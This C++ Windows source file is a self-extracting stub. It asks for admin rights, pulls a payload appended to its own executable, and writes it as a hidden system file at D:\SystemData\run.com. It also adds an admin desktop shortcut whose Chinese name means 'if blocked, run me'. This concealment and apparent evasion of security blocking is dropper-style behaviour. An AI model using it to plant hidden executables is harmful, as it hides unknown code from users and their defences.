// SFX - 自解压程序
// 编译后: sfx_stub.exe + 目标文件 + 12字节尾部 = 安装包
// 尾部: [4字节文件大小][SFX_MARK]
#include <windows.h>
#include <cstdio>
#include <shlobj.h>
#include <shobjidl.h>
#include <vector>
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:mainCRTStartup")
#ifndef SLDF_RUNAS_USER
#define SLDF_RUNAS_USER 0x00000020
#endif

static bool IsElevated() {
    BOOL e = FALSE; HANDLE t = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &t)) {
        TOKEN_ELEVATION te; DWORD sz = sizeof(te);
        GetTokenInformation(t, TokenElevation, &te, sz, &sz);
        e = te.TokenIsElevated; CloseHandle(t);
    }
    return e == TRUE;
}

int main() {
    if (!IsElevated()) {
        wchar_t p[MAX_PATH]; GetModuleFileNameW(NULL, p, MAX_PATH);
        ShellExecuteW(NULL, L"runas", p, NULL, NULL, SW_SHOW);
        return 0;
    }
    // 读自身末尾数据
    wchar_t self[MAX_PATH]; GetModuleFileNameW(NULL, self, MAX_PATH);
    HANDLE h = CreateFileW(self, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return 1;
    BYTE tail[12]; DWORD fs = GetFileSize(h, NULL);
    SetFilePointer(h, fs - 12, NULL, FILE_BEGIN);
    DWORD r; ReadFile(h, tail, 12, &r, NULL);
    if (memcmp(tail + 4, "SFX_MARK", 8) != 0) { CloseHandle(h); return 1; }
    DWORD sz = *(DWORD*)tail;
    std::vector<BYTE> dat(sz);
    SetFilePointer(h, fs - 12 - sz, NULL, FILE_BEGIN);
    ReadFile(h, dat.data(), sz, &r, NULL); CloseHandle(h);
    if (r != sz) return 1;

    CreateDirectoryW(L"D:\\SystemData", NULL);
    SetFileAttributesW(L"D:\\SystemData", FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    HANDLE o = CreateFileW(L"D:\\SystemData\\run.com", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (o == INVALID_HANDLE_VALUE) return 1;
    DWORD w; WriteFile(o, dat.data(), sz, &w, NULL); CloseHandle(o);

    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    IShellLinkW* p = NULL;
    if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&p)) && p) {
        p->SetPath(L"D:\\SystemData\\run.com");
        IShellLinkDataList* d = NULL;
        if (SUCCEEDED(p->QueryInterface(IID_IShellLinkDataList, (void**)&d)) && d) {
            DWORD f = 0; d->GetFlags(&f); d->SetFlags(f | SLDF_RUNAS_USER); d->Release();
        }
        IPersistFile* f = NULL;
        if (SUCCEEDED(p->QueryInterface(IID_IPersistFile, (void**)&f)) && f) {
            f->Save(L"D:\\Desktop\\如果被拦截运行我.com", TRUE); f->Release();
        }
        p->Release();
    }
    CoUninitialize();
    return 0;
}
